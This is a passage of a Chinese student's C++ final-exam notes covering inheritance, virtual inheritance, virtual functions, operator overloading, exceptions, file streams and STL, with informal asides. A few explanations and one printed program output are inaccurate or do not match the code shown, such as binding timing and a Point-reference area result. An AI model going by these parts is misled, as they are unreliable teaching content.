string&amp; n, int a) : name(n), age(a) &#123;        cout &lt;&lt; &quot;动物 [&quot; &lt;&lt; name &lt;&lt; &quot;] 出生了，年龄: &quot; &lt;&lt; age &lt;&lt; &quot; 岁&quot; &lt;&lt; endl;    &#125;        // 析构函数：清理资源    ~Animal() &#123;        cout &lt;&lt; &quot;动物 [&quot; &lt;&lt; name &lt;&lt; &quot;] 离开了，享年 &quot; &lt;&lt; age &lt;&lt; &quot; 岁&quot; &lt;&lt; endl;    &#125;        // 类方法：展示功能    void makeSound() const &#123;        cout &lt;&lt; name &lt;&lt; &quot; 发出动物声音&quot; &lt;&lt; endl;    &#125;        void eat(const string&amp; food) const &#123;        cout &lt;&lt; name &lt;&lt; &quot; 正在吃 &quot; &lt;&lt; food &lt;&lt; endl;    &#125;        string getName() const &#123; return name; &#125;    int getAge() const &#123; return age; &#125;&#125;;// 派生类：扩展基类功能class Dog : public Animal &#123;private:    string breed;    public:    // 派生类构造函数：先调用基类构造函数初始化基类部分    Dog(const string&amp; n, int a, const string&amp; b) //注意也需要提供基类构造方法的参数        : Animal(n, a), breed(b) &#123;  //调用Animal类的构造方法，在此基础上再为Dog类新属性breed赋值        cout &lt;&lt; &quot;这是一只 &quot; &lt;&lt; breed &lt;&lt; &quot; 品种的狗&quot; &lt;&lt; endl;    &#125;        // 派生类析构函数：先执行派生类清理，再自动调用基类析构函数    ~Dog() &#123;        cout &lt;&lt; breed &lt;&lt; &quot; 狗即将离开&quot; &lt;&lt; endl;    &#125;        // 扩展基类功能    void bark() const &#123;        cout &lt;&lt; getName() &lt;&lt; &quot; 汪汪叫！&quot; &lt;&lt; endl;    &#125;        void fetch(const string&amp; item) const &#123;        cout &lt;&lt; getName() &lt;&lt; &quot; 正在捡回 &quot; &lt;&lt; item &lt;&lt; endl;    &#125;        string getBreed() const &#123; return breed; &#125;&#125;;int main() &#123;    cout &lt;&lt; &quot;=== 程序开始 ===&quot; &lt;&lt; endl;        &#123;        cout &lt;&lt; &quot;\\n--- 创建Dog对象 ---&quot; &lt;&lt; endl;        Dog myDog(&quot;旺财&quot;, 3, &quot;金毛&quot;);                cout &lt;&lt; &quot;\\n--- 使用基类功能 ---&quot; &lt;&lt; endl;        myDog.makeSound();        // 继承自基类        myDog.eat(&quot;狗粮&quot;);        // 继承自基类                cout &lt;&lt; &quot;\\n--- 使用派生类功能 ---&quot; &lt;&lt; endl;        myDog.bark();             // 派生类特有        myDog.fetch(&quot;球&quot;);        // 派生类特有                cout &lt;&lt; &quot;\\n--- 获取对象信息 ---&quot; &lt;&lt; endl;        cout &lt;&lt; &quot;名字: &quot; &lt;&lt; myDog.getName() &lt;&lt; endl;        cout &lt;&lt; &quot;年龄: &quot; &lt;&lt; myDog.getAge() &lt;&lt; &quot;岁&quot; &lt;&lt; endl;        cout &lt;&lt; &quot;品种: &quot; &lt;&lt; myDog.getBreed() &lt;&lt; endl;                cout &lt;&lt; &quot;\\n--- Dog对象即将离开作用域 ---&quot; &lt;&lt; endl;    &#125; // myDog在这里被销毁        cout &lt;&lt; &quot;\\n=== 程序结束 ===&quot; &lt;&lt; endl;    return 0;&#125;\n\n\n\n\n\n4.多重继承与虚继承这个其实就是和继承一样，只不过从继承一个变为了继承多个，只需要这几个基类不会出现二义性就和普通继承一样\n虽然说是这么说，但是如果继承的层数多起来就会导致一些难以处理的问题。\n我们来看一组继承关系\nclass A &#123;public:    int x;&#125;;class B : public A &#123;&#125;;class C : public A &#123;&#125;;class D : public B, public C &#123;&#125;;//我们可以看到，当b和c继承自a的时候会拥有同名的来自a的数据，当D同时继承b和c会出现二义性冲突而导致编译错误\n\n这个问题就是典型的菱形继承，解决这种问题的最好办法就是虚继承，通过虚继承的派生类，继承到的全部都是共享的一个虚基类。\n我们从上面虚继承的内存分布我们可以知道，使用虚继承的类指向的都是同一个虚基类，然后在被一个类进行多继承的时候那个派生类就会继承到。\n然后就是和普通继承不同的地方来了，我们普通继承的话都是继承一次构造一次，也就是内存是\nA-&gt;B-&gt;C//B中是，构造一次AA|B//C中则是会构造一个B，由于B中构造了A，所以C其实也构造了AA|B|C\n\n到了虚继承这里，就有很大的不同，基类A并不是由虚继承的B，C构造出来的，而是由最后多继承的D构造出来。\n我们来看一下代码\nclass A &#123;public:    A(int v) &#123; cout &lt;&lt; &quot;A &quot; &lt;&lt; v &lt;&lt; endl; &#125;&#125;;class B : virtual public A &#123;public:    B() : A(1) &#123;&#125;&#125;;class C : virtual public A &#123;public:    C() : A(2) &#123;&#125;&#125;;class D : public B, public C &#123;public:    D() : A(3), B(), C() &#123;&#125;&#125;;\n\n当我们定义D对象的时候会输出\nA 3\n\n我们可以看到，当同时调用基类的构造方法进行对A传递的时候，明明是最先传进行的3，最后却保留了下来，这也就说明了\n\nB()、C()里对 A 的初始化 会被忽略（因为只有构造对象的那个对象才能对其进行操作）\n只有 D 对 A 的初始化有效\n\n于是说明B和C对没有对A进行构造，事实上BC由于没有构造A，使用的其实是D构造出来的那个A对象\n“虚基类由最派生类构造”这句话始终成立\n当然，这个时候就会有疑惑，既然虚基类A是由D进行构造的，那B和C又是如何构造A的呢？其实，B和C和普通继承使用上没什么区别，重写等操作都是看起来一样的。但是BC实际上是将普通继承中构造出来的那个A对象变为了一个vbptr，这个指针指向BC共同的那个A对象。\n于是我们的虚继承代码\nclass A &#123; int x; &#125;;class B : virtual public A &#123;&#125;;class C : virtual public A &#123;&#125;;//需要注意为了破解菱形继承，需要继承的多个类都进行虚继承class D : public B, public C &#123;    int y;&#125;;//实际上的内存空间为| B 子对象 | C 子对象 | A(虚基类) | D::y |\n\n然后需要注意的是，由于是D作为最派生类构造了A，于是B和C这两个构造出来的子类对A的操作都会被忽略。和重写一样，只有构造对象的那个对象才能进行操作。\n也就是说虚继承的类也就是B和C其实和普通继承使用相似，只不过多了被多继承时只保留一个虚基类A，只不过是有一个标签表明他们是虚继承了同一个了类，这个标签也就是一个指向虚基类A的指针vbptr，以这个vbptr来判断其虚继承的是否为同一个对象。\n而D才是虚继承那个重要的类，会通过BC的标签识别出是同一个类，然后由D亲自去构造一个A虚基类，然后A只由D去操作，其内存中BC对象的操作都被忽略。我觉得这样设计的原因是为了解决菱形继承BC中对虚基类的重写等问题\n我们最后再来看一段代码和内存分布\nclass Base &#123; /*...*/ &#125;;class Derived1 : virtual public Base &#123; /*...*/ &#125;;class Derived2 : virtual public Base &#123; /*...*/ &#125;;class Final : public Derived1, public Derived2 &#123;    // 现在Final中只有一份Base子对象&#125;;\n\n内存分布\nFinal 对象:+-------------------+| Derived1          || +---------------+ || | vptr          | |--&gt; Derived1的虚表| +---------------+ |+-------------------+| Derived2          || +---------------+ || | vptr          | |--&gt; Derived2的虚表| +---------------+ |+-------------------+| Base              || +---------------+ || | data          | || +---------------+ |+-------------------+| Final 特有数据    |+-------------------+\n\n\n\n我们构造函数中各种构造函数的调用顺序\n调用顺序是：\n\n所有虚基类构造函数（按继承列表中的声明顺序）\n所有直接非虚基类构造函数（按继承列表中的声明顺序）\n所有成员对象的构造函数（按类中声明的顺序）\n派生类自身的构造函数\n\n为什么虚继承一定需要动态绑定\n这是因为代码没有运行的时候，由于BC都无法知道那个虚基类A的位置到底在哪，如果是普通继承的话等代码运行的时候再获取也没问题，因为都是单独构造的，没什么特别操作。\n但是虚继承需要BC中指向同一个A对象，但是在编译过程中无法确定这共用A的地址。\n还有就是会无法在编译过程确定最派生类，最派生类需要自己构造一个虚基类A，如果不运行代码无法确定到底是哪个类是最派生类。\n3.动态多态性多态性其实就是决定使用哪个函数的一个性质，多态允许同一接口根据上下文表现出不同行为。最常见的就是静态多态，在一个对象中，拥有多个同名的函数，却因为函数的参数不同而调用不同的函数，主要有参数数量不同，参数类型不同，参数顺序不同等。\n但是我们现在写的不是静态多态性，这个后面会和函数模板，重载和运算符重载一起写。现在要学的是动态多态性\n首先我们要知道一个事情，C++代码在运行期间会现在编译过程中完成静态绑定和动态绑定。\n其中静态绑定就是决定好该使用哪个对象和调用哪个函数这些都是普通的对象和函数，都是可以不通过运行代码就知道的。\n动态绑定则是需要运行代码才能知道要执行哪些操作，比如虚继承，和虚函数。虚函数就是动态多态性的代表，需要进行动态绑定。\n1.虚函数我们之前知道之所以派生类的指针可以转换为基类的指针，这是因为派生类对象中也内嵌了一个基类对象，于是可以转换，但是如果使用的是转换为基类的指针去调用一个被重写了的方法，代码运行就会根据这是基类的指针而选择去调用基类的方法（其实是通过基类指针只能去调用基类的成员），而不是重写的方法，使用虚函数就是为了解决这个问题\n我们之前会面对一个问题，当我们来看下面代码\n#include &lt;iostream&gt;using namespace std;class Point&#123;    int xValue;    int yValue;public:    Point(int x, int y)    &#123;        xValue = x;        yValue = y;    &#125;    float area()    &#123;        return 0;    &#125;    void showPoint()    &#123;        cout &lt;&lt; &quot;点的坐标 &quot; &lt;&lt; &quot;(&quot; &lt;&lt; xValue &lt;&lt; &quot;,&quot; &lt;&lt; yValue &lt;&lt; &quot;)&quot; &lt;&lt; endl;    &#125;&#125;;class Circle : public Point&#123;    int radius;public:    Circle(int x, int y, int r) : Point(x, y)    &#123;        radius = r;    &#125;    float area()    &#123;        return 3.14 * radius * radius;    &#125;    void showCircle()    &#123;        showPoint();        cout &lt;&lt; &quot;圆的半径 r=&quot; &lt;&lt; radius &lt;&lt; endl;    &#125;&#125;;int main()&#123;    Point pt1(10, 10);    pt1.showPoint();    cout &lt;&lt; &quot;*****&quot; &lt;&lt; endl;    Circle c(0, 0, 1);    c.showCircle();    cout &lt;&lt; &quot;*****&quot; &lt;&lt; endl;    pt1 = c;    pt1.showPoint();    cout &lt;&lt; &quot;*****&quot; &lt;&lt; endl;    Point &amp;p2 = c;    p2.showPoint();    cout &lt;&lt; &quot;*****&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;点的面积 &quot; &lt;&lt; pt1.area() &lt;&lt; endl;    cout &lt;&lt; &quot;*****&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;点的面积 &quot; &lt;&lt; p2.area() &lt;&lt; endl;    cout &lt;&lt; &quot;*****&quot; &lt;&lt; endl;    Point *p3 = &amp;pt1;    cout &lt;&lt; &quot;点的坐标 &quot; &lt;&lt; endl;    p3-&gt;showPoint();    cout &lt;&lt; &quot;点的面积 &quot; &lt;&lt; p3-&gt;area() &lt;&lt; endl;    cout &lt;&lt; &quot;*****&quot; &lt;&lt; endl;    Point *p4 = &amp;c;    cout &lt;&lt; &quot;圆的坐标 &quot; &lt;&lt; endl;    p4-&gt;showPoint();    cout &lt;&lt; &quot;圆的面积 &quot; &lt;&lt; p4-&gt;area() &lt;&lt; endl;//虽然我们是将c的地址赋值给了Point*指针是合法的，但是最后在通过p4调用area方法的时候却返回的是0，这里的原因是    return 0;&#125;\n\n程序运行结果为\n点的坐标 (10,10)*****点的坐标 (0,0)圆的半径 r=1*****点的坐标 (0,0)*****点的坐标 (0,0)*****点的面积 0圆的面积 3.14*****点的面积 0圆的面积 0\n\n最后输出圆的面积的时候调用不是Circle重写的方法，而是通过基类指针调用基类的area方法\n那我们是如何使用虚函数来解决这个问题的呢\n语法\nvirtual 普通函数\n\n虚函数是定义在基类中的，virtual表明这个函数是虚函数，然后虚函数不是像普通函数一样存放，如果一个类有虚函数就会有一个虚函数表用来存放虚函数。\n我们都知道当派生类继承基类的时候会在其中内嵌一个基类，函数和属性一样都会内嵌，然后重写的时候不会对基类的方法进行改写，而是在通过对象调用的时候会调用派生类重写的方法。\n但是虚函数不一样，继承的时候派生类也会继承基类的虚函数表，之所以不能和普通函数放一起，是因为虚函数表中会被完全覆盖，而不是像普通函数那样只是不同的调用。\n我们先来看一下普通函数是如何进行调用的\np-&gt;f();//等价于A::f(p);\n\n虚函数则是\np-&gt;f();(*(p-&gt;vptr)[idx])(p);//idx是虚函数在虚函数表中的序号//vptr是虚函数表的地址\n\n我们看到会直接通过p指针访问到虚函数然后执行。\n于是虚函数之所以可以通过派生类转化为的基类指针调用重写的虚函数，这是因为\n\n首先虚函数表派生类不会重新创建，而是直接进行覆盖\n其次调用的时候不是通过确定对象类型再去代码区调用函数，而是直接通过指针找到虚函数进行调用\n能够直接通过指针去找虚函数表是因为有vptr指针\n\n于是虚函数调用的时候不需要考虑指针类型，而是通过虚函数表直接调用。\n2.纯虚函数与抽象基类我们知道了虚函数之后就发现一个问题，如果函数被定义为虚函数就可以在虚函数表中被完全覆盖，也就意味着虚函数表或许可以不需要基类去实现，这让我想起了Java的抽象类和接口可能和这个相似\n纯虚函数\n纯虚函数是一个没有具体实现的函数，通过在函数声明后面不加括号实现，而是加上&#x3D;0表示这个是一个纯虚函数，本质是将指向函数实现的指针定义为null。\n由于函数没有被实现于是含有纯虚函数的类也被称为抽象类，由于函数没有被实现导致不能被实例化为对象，但是却可以被继承。继承的类如果还是没有实现纯虚函数，就还是抽象类不能被定义为对象。\n语法\nvirtual 函数类型 函数名 (参数表)=0;\n\n由于纯虚函数没有实现，于是是不能对其进行调用的，需要在派生类中重写具体实现才能定义对象然后调用函数。\n抽象基类\n抽象基类就是包含纯虚函数的类，不能直接被定义为对象，只能被继承。\n相应的，纯虚函数也属于虚函数，抽象基类中也会有vptr指针指向vtable（虚函数表），只不过由于指向具体实现的指针为null，导致必须被派生类重写才行，于是通过基类指针调用的纯虚函数也是被派生类重写的结果。\n实例\n#include &lt;iostream&gt;using namespace std;class Shape &#123;public:    // 纯虚函数：计算面积    virtual double area() const = 0;    // 纯虚函数：绘制图形    virtual void draw() const = 0;    // 虚析构函数（非常重要）    virtual ~Shape() &#123;&#125;&#125;;class Rectangle : public Shape &#123;private:    double width;    double height;public:    Rectangle(double w, double h)        : width(w), height(h) &#123;&#125;    double area() const override &#123;        return width * height;    &#125;    void draw() const override &#123;        cout &lt;&lt; &quot;Draw Rectangle\\n&quot;;    &#125;&#125;;class Circle : public Shape &#123;private:    double radius;public:    Circle(double r) : radius(r) &#123;&#125;    double area() const override &#123;        return 3.14159 * radius * radius;    &#125;    void draw() const override &#123;        cout &lt;&lt; &quot;Draw Circle\\n&quot;;    &#125;&#125;;int main() &#123;    // 抽象类不能实例化    // Shape s;  // ❌ 编译错误    Shape* s1 = new Rectangle(3, 4);    Shape* s2 = new Circle(5);    s1-&gt;draw();    cout &lt;&lt; &quot;Area: &quot; &lt;&lt; s1-&gt;area() &lt;&lt; endl;    s2-&gt;draw();    cout &lt;&lt; &quot;Area: &quot; &lt;&lt; s2-&gt;area() &lt;&lt; endl;    delete s1;    delete s2;    return 0;&#125;\n\n\n\n3.虚析构函数我们现在已经知道了，只要名字里面有个虚的函数，就会被放到虚函数表，用来重写覆盖掉基类的虚函数，以此来让派生类转换为基类指针后根据对象类型调用正确的函数。\n我们都知道构造和析构函数都是不能被继承的，需要我们每次自己重写。于是如果有使用基类指针的请况下，虚析构函数是很重要的。\n虽然我不知道析构函数的作用到底是什么，也不知道主动调用和对象声明周期结束自动的区别。\n我的理解就是主动调用析构函数不会销毁对象的内存，而是会将对象内存以外其他该对象使用的内存进行释放比如\n典型资源包括：\n\nnew 出来的内存\n文件句柄（FILE*）\nsocket\nmutex &#x2F; lock\nGPU &#x2F; 系统句柄\n数据库连接\n日志 &#x2F; 临时文件\n\n然后对象生命周期结束的时候对象内存也被释放了，这个时候需要自动调用析构函数去带走其他内存。然后析构函数中的代码可能是需要同时执行某些操作。\n我们先来看一个错误示例\n#include &lt;iostream&gt;using namespace std;class Base &#123;public:    ~Base() &#123;        cout &lt;&lt; &quot;Base destructor\\n&quot;;    &#125;&#125;;class Derived : public Base &#123;public:    ~Derived() &#123;        cout &lt;&lt; &quot;Derived destructor\\n&quot;;    &#125;&#125;;int main() &#123;    Base* p = new Derived;    delete p; //delete语句销毁对象&#125;\n\n执行结果\nBase destructor\n\n这个问题就在于通过基类指针在对象被销毁的时候调用的是基类的析构方法，虽然delete执行的时候也会把派生类对象给销毁掉，但是执行的不是派生类的析构函数，会导致派生类除对象内存外的其他内存被泄露。\n\nDerived::~Derived() 没有被调用\n如果 Derived 里有：\n\nnew 出来的内存\n文件句柄\nmutex &#x2F; socket &#x2F; 资源\n\n\n\n\n👉 全部泄漏\n\n于是我们需要将基类的析构函数变为虚析构函数\n#include &lt;iostream&gt;using namespace std;class Base &#123;public:    virtual ~Base() &#123;        cout &lt;&lt; &quot;Base destructor\\n&quot;;    &#125;&#125;;class Derived : public Base &#123;public:    ~Derived() &#123;        cout &lt;&lt; &quot;Derived destructor\\n&quot;;    &#125;&#125;;int main() &#123;    Base* p = new Derived;    delete p; //delete语句销毁对象&#125;\n\n执行结果\n//和构造函数一样，派生类执行析构函数的时候也会执行基类的析构函数Derived destructorBase destructor\n\n\n\n\n\n4.重载我们之前已经了解了一些重载的知识，主要就是静态多态性也就是编译期多态，在同名函数的请况下根据参数的数量，类型，顺序不同而可以实现调用同名函数使用不同参数有不同的实现的操作。\n1.函数重载我们还是有必要复习一下函数重载的。\n在同一作用域中，函数名相同、参数列表不同，编译器可以根据调用实参在编译期选择正确的函数，这叫函数重载。\n关键点只有三个：\n\n同名\n参数列表不同\n编译期决定\n\n参数列表不同还是那三个\n\n参数个数不同\n参数类型不同\n参数顺序不同\n\n需要注意返回值不同不能进行函数重载。\n示例代码\n#include &lt;iostream&gt;using namespace std;void print(int x) &#123;    cout &lt;&lt; &quot;int: &quot; &lt;&lt; x &lt;&lt; endl;&#125;void print(double x) &#123;    cout &lt;&lt; &quot;double: &quot; &lt;&lt; x &lt;&lt; endl;&#125;void print(int x, int y) &#123;    cout &lt;&lt; &quot;int, int: &quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; endl;&#125;int main() &#123;    print(10);        // int    print(3.14);      // double    print(1, 2);      // int, int&#125;\n\n\n\n然后还有一些我们需要注意的地方\n1️⃣ 派生类会隐藏基类同名函数\nstruct Base &#123;    void f(int);    void f(double);&#125;;struct Derived : Base &#123;    void f(int);&#125;;Derived d;d.f(3.14); // ❌ 编译错误\n\n会编译错误的原因是派生类重写会隐藏掉基类所有的同名函数，会把所有重载都隐藏。\n正确做法：using 声明\nstruct Derived : Base &#123;    using Base::f;//这里使用的是using的继承中的成员引入功能，引入Base的所有函数名为f的函数    void f(int);&#125;;\n\n\n\n2️⃣ 默认参数 + 重载（危险组合）\nvoid f(int x, int y = 0);void f(int x);f(10); // ❌ 二义性\n\n\n\n2.运算符重载其实在代码中运算符也可以看作一个简单的函数，比如+就是获取两边的数字作为参数然后返回两个数字的和。\n我们其实也可以注意到一些运算符重载的信息，比如C++相较于C语言，可以直接使用+来进行两个字符串的拼接。这个就是C++中string类对运算符的一个重载\n运算符重载是为自定义类型（class &#x2F; struct）赋予“运算符语义”的一种函数重载机制，本质仍然是函数调用，且完全发生在编译期。\n关键理解：\n\n不是发明新运算符\n不是改变运算符优先级\n只是 “运算符 + 自定义类型” 的函数重载\n\n语法\n返回类型 operator 运算符 (参数列表) &#123;具体实现&#125;;\n\n\n\n运算符重载基本规则\n1️⃣ 至少有一个操作数是用户自定义类型\nint operator+(int, int); // ❌ 不允许\n\n至于为什么必须要有一个操作数是用户自定义的，这是为了让使用者使用运算符重载是为了方便对特殊类型比如说类和结构体这些用户自定义类型进行运算。\n如果可以全部使用系统类型就会导致可以将+重写为乘法，然后从类型上说的化如果全部使用系统类型也会极易导致重载之间重复使用同一种参数组合导致编译失败。\n2️⃣ 不能改变运算符的本质属性\n不能改变：\n\n优先级\n结合性\n操作数个数\n\n3️⃣ 有些运算符不能重载\n不能重载的包括：\n\n.\n.*\n::\n?:\nsizeof\ntypeid\n\n运算符重载的使用\n我们先来看一下实例\n#include &lt;iostream&gt;using namespace std;class Vec2 &#123;public:    double x, y;    Vec2(double x = 0, double y = 0) : x(x), y(y) &#123;&#125;    // +    friend Vec2 operator+(const Vec2&amp; a, const Vec2&amp; b) &#123;        return Vec2(a.x + b.x, a.y + b.y);    &#125;    // +=    Vec2&amp; operator+=(const Vec2&amp; rhs) &#123;        x += rhs.x;        y += rhs.y;        return *this;    &#125;    // ==    friend bool operator==(const Vec2&amp; a, const Vec2&amp; b) &#123;        return a.x == b.x &amp;&amp; a.y == b.y;    &#125;    // &lt;&lt;    friend ostream&amp; operator&lt;&lt;(ostream&amp; os, const Vec2&amp; v) &#123;        os &lt;&lt; &quot;(&quot; &lt;&lt; v.x &lt;&lt; &quot;, &quot; &lt;&lt; v.y &lt;&lt; &quot;)&quot;;        return os;    &#125;&#125;;int main() &#123;    Vec2 a(1, 2);    Vec2 b(3, 4);    Vec2 c = a + b;     // 使用 +    a += b;             // 使用 +=    if (a == c) &#123;        cout &lt;&lt; &quot;equal\\n&quot;;    &#125;    cout &lt;&lt; a &lt;&lt; endl;  // 使用 &lt;&lt;//重载了流运算符&#125;//输出equal(4, 6)\n\n我们调用重载运算符的方法有好几种简单的主要是\n\n直接调用Complex c = a + b; \n显示调用Complex c = a.operator+(b);\n\n我们需要注意，有些方法返回类型是类名，有些则是类名&amp;。这个其中Vec2&amp;这种属于对类的引用，也就是别名Vec2&amp; rhs这个不是简单的一个名字是rhs的Vec2的对象，而是对作为参数的那个对象的一个别名，实际上在内存中指向的就是参数那个对象，对其的修改会直接影响到传入的参数，而不是和普通的参数一样复制一次。\n于是当使用Vec2&amp;这种返回值的时候返回的就是调用方法对象的一个别名，显示调用就是Vec2&amp; c=a.operator+=(b);由于返回值是一个引用，所以我们也需要返回*this。\n我们的运算符特别多，不止 简单的加减乘除，还有一元运算符，二元运算符，赋值运算符，C++中的流运算符，以及new、delete等的其他运算符。\n这些运算符在重载的时候有点不一样，需要注意一下\n重载单目运算符\nCounter&amp; operator++() &#123;&#125;//前置Counter&amp; operator++(int) &#123;&#125;//后置Counter operator-() const &#123;&#125;//普通单元运算符\n\n后置中那个int仅仅用来区分运算符的前置和后置，没有什么意义，直接调用的时候可以忽略。显示调用需要加上operator++(int)\n重载流运算符\n流运算符包括插入运算符和提取运算符，分别是&gt;&gt;和&lt;&lt;\nstd::ostream&amp; operator&lt;&lt;(std::ostream&amp; os, const Date&amp; date);std::istream&amp; operator&gt;&gt;(std::istream&amp; is, Date&amp; date);\n\n我们注意到重载的时候返回类型和第一个参数类型需要对应，&lt;&lt;对应的是ostream，&gt;&gt;对应的则是istream。\n实例\nclass Date &#123;    int year, month, day;public:    Date(int y = 2000, int m = 1, int d = 1) : year(y), month(m), day(d) &#123;&#125;        // 友元声明，让非成员函数可以访问私有成员    friend std::ostream&amp; operator&lt;&lt;(std::ostream&amp; os, const Date&amp; date);    friend std::istream&amp; operator&gt;&gt;(std::istream&amp; is, Date&amp; date);        // 验证日期有效性    bool isValid() const &#123;        if (month &lt; 1 || month &gt; 12) return false;        if (day &lt; 1 || day &gt; 31) return false;        // 简化验证，实际应更复杂        return true;    &#125;&#125;;// 输出运算符std::ostream&amp; operator&lt;&lt;(std::ostream&amp; os, const Date&amp; date) &#123;    os &lt;&lt; date.year &lt;&lt; &quot;-&quot;        &lt;&lt; std::setw(2) &lt;&lt; std::setfill(&#x27;0&#x27;) &lt;&lt; date.month &lt;&lt; &quot;-&quot;       &lt;&lt; std::setw(2) &lt;&lt; std::setfill(&#x27;0&#x27;) &lt;&lt; date.day;    return os;&#125;// 输入运算符std::istream&amp; operator&gt;&gt;(std::istream&amp; is, Date&amp; date) &#123;    char dash1, dash2;    is &gt;&gt; date.year &gt;&gt; dash1 &gt;&gt; date.month &gt;&gt; dash2 &gt;&gt; date.day;        if (dash1 != &#x27;-&#x27; || dash2 != &#x27;-&#x27; || !date.isValid()) &#123;        is.setstate(std::ios::failbit);  // 设置错误状态    &#125;        return is;&#125;\n\n\n\n\n\n5.异常处理妈的，怎么期末考试什么东西都要考啊，还有异常处理。\n异常处理和我们之前常见的语法错误不同，异常处理需要处理一些编译器无法识别出的错误（非语法错误），而是在运行期间的问题，比如文件打开失败、使用除法去除0、数组下标越界。\n我们先来看异常处理的关键字\ntry &#123;        // 尝试执行    ...&#125;catch (...) &#123; // 捕获异常    ...&#125;throw ...;    // 抛出异常\n\ntry其实没有什么特别，是配合catch使用的。throw语句就是先输出我们设置好的异常然后停止运行。通过栈去寻找到最近的catch，让catch语句去捕获异常。但是throw语句去找catch的过程好像有点复杂，我只求我考试过了就行，直接记代码吧\n示例\n#include &lt;iostream&gt;using namespace std;int divide(int a, int b) &#123;    if (b == 0)        throw &quot;division by zero&quot;;//触发throw会抛出异常division by zero然后停止代码    return a / b;&#125;int main() &#123;    try &#123;        cout &lt;&lt; divide(10, 0) &lt;&lt; endl;//由于是调用函数除0，不是直接写10/0，这个会在运行期间报错    &#125;    catch (const char* msg) &#123;        cout &lt;&lt; &quot;error: &quot; &lt;&lt; msg &lt;&lt; endl;    &#125;&#125;\n\n执行流程是：\n\ndivide() 中 throw\n立即终止当前函数\n沿调用栈向上查找 catch\n找到后执行 catch\n程序继续运行\n\n6.文件操作这个也要考，还考好几次。ಥ_ಥ\n我们之前每次写代码都会写上iostream库，这个库提供给了我们C++中的各种流。cout是标准输出流，cin是标准输入流\n文件操作也需要各种文件读写流，于是我们也需要使用到一个库\n#include &lt;fstream&gt;\n\n我们先来看一下常见的文件流\n1️⃣ ifstream —— 读文件\nifstream in(&quot;data.txt&quot;);\n\n\ninput file stream\n只读\n默认 ios::in\n\n2️⃣ ofstream —— 写文件\nofstream out(&quot;data.txt&quot;);\n\n\noutput file stream\n默认 ios::out\n会清空原文件\n\n3️⃣ fstream —— 读 + 写\nfstream fs(&quot;data.txt&quot;, ios::in | ios::out);\n\n\n需要显式指定模式\n灵活，但更容易出错\n\n然后我们读取的数据就是储存在in流中，通过out流，我们可以对文件进行写入。\n1.文件打开流程//构造时打开ifstream in(&quot;data.txt&quot;);//创建对象，然后使用open方法打开ifstream in;in.open(&quot;data.txt&quot;);//每次必须检查是否成功打开if (!in.is_open()) &#123;    cout &lt;&lt; &quot;file open failed\\n&quot;;&#125;//如果是在构造时打开我们可以通过判断in对象是否成功创建来判断是否成功打开    if (!in) &#123;        cout &lt;&lt; &quot;open failed\\n&quot;;        return 1;    &#125;\n\n\n\n2.文件打开模式\n\n\n模式\n含义\n\n\n\nios::in\n读\n\n\nios::out\n写\n\n\nios::app\n追加\n\n\nios::trunc\n清空\n\n\nios::binary\n二进制\n\n\nios::ate\n打开后定位到末尾\n\n\n一些常见组合\n//追加写ofstream out(&quot;log.txt&quot;, ios::app);//读写同一文件fstream fs(&quot;data.txt&quot;, ios::in | ios::out);//二进制读取ifstream in(&quot;a.bin&quot;, ios::binary);ofstream out(&quot;a.txt&quot;); //等价于ofstream out(&quot;a.txt&quot;, ios::out | ios::trunc);//因为前面是ofstream，所以只能进行写\n\n每次区分读写，可以通过类型来判断 if 就是读 of 就是写， fs 则是读写。\n3.文件读写操作1️⃣ 按行读取（最推荐）\nstring line;while (getline(in, line)) &#123;    cout &lt;&lt; line &lt;&lt; endl;&#125;\n\n📌 优点：\n\n不丢空格\n不丢空行\n不受格式影响\n\n2️⃣ 用 &gt;&gt; 读取（格式化输入）\nint a;string s;in &gt;&gt; a &gt;&gt; s;\n\n⚠️ 特点：\n\n跳过空白符\n不适合读整行文本\n\n3️⃣ 写文件（和 cout 一模一样）考试一般考这个\nout &lt;&lt; &quot;hello&quot; &lt;&lt; endl;out &lt;&lt; 123 &lt;&lt; &quot; &quot; &lt;&lt; 3.14 &lt;&lt; endl;\n\n就当作输出一样写文件就行了\n我们来看一个文件读写的实例\n#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;int main() &#123;    ifstream in(&quot;input.txt&quot;);//读取文件    if (!in) &#123;        cerr &lt;&lt; &quot;open failed\\n&quot;;        return 1;    &#125;    ofstream out(&quot;output.txt&quot;, ios::app);//创建写文件流    string line;    while (getline(in, line)) &#123; //getline获取一行给line        out &lt;&lt; line &lt;&lt; endl; //写入文件就像输出一样    &#125;&#125;\n\n\n\n\n\n\n\n\n\n7.STL编程明明这个好像在课上都没有讲，但是为什么期末考试会考啊。\nC++ 标准模板库（Standard Template Library，STL）是一套功能强大的 C++ 模板类和函数的集合，它提供了一系列通用的、可复用的算法和数据结构。\nSTL 的设计基于泛型编程，这意味着使用模板可以编写出独立于任何特定数据类型的代码。\nSTL 分为多个组件，包括容器（Containers）、迭代器（Iterators）、算法（Algorithms）、函数对象（Function Objects）和适配器（Adapters）等。\n使用 STL 的好处:\n\n代码复用：STL 提供了大量的通用数据结构和算法，可以减少重复编写代码的工作。\n性能优化：STL 中的算法和数据结构都经过了优化，以提供最佳的性能。\n泛型编程：使用模板，STL 支持泛型编程，使得算法和数据结构可以适用于任何数据类型。\n易于维护：STL 的设计使得代码更加模块化，易于阅读和维护。\n\n\n\n\n组件\n描述\n\n\n\n容器（Containers）\n容器是 STL 中最基本的组件之一，提供了各种数据结构，包括向量（vector）、链表（list）、队列（queue）、栈（stack）、集合（set）、映射（map）等。这些容器具有不同的特性和用途，可以根据实际需求选择合适的容器。\n\n\n算法（Algorithms）\nSTL 提供了大量的算法，用于对容器中的元素进行各种操作，包括排序、搜索、复制、移动、变换等。这些算法在使用时不需要关心容器的具体类型，只需要指定要操作的范围即可。\n\n\n迭代器（iterators）\n迭代器用于遍历容器中的元素，允许以统一的方式访问容器中的元素，而不用关心容器的内部实现细节。STL 提供了多种类型的迭代器，包括随机访问迭代器、双向**迭代器、前向迭代器和输入输出迭代器等。\n\n\n函数对象（Function Objects）\n函数对象是可以像函数一样调用的对象，可以用于算法中的各种操作。STL 提供了多种函数对象，包括一元函数对象、二元函数对象、谓词等，可以满足不同的需求。\n\n\n适配器（Adapters）\n适配器用于将一种容器或迭代器适配成另一种容器或迭代器，以满足特定的需求。STL 提供了多种适配器，包括栈适配器（stack adapter）、队列适配器（queue adapter）和优先队列适配器（priority queue 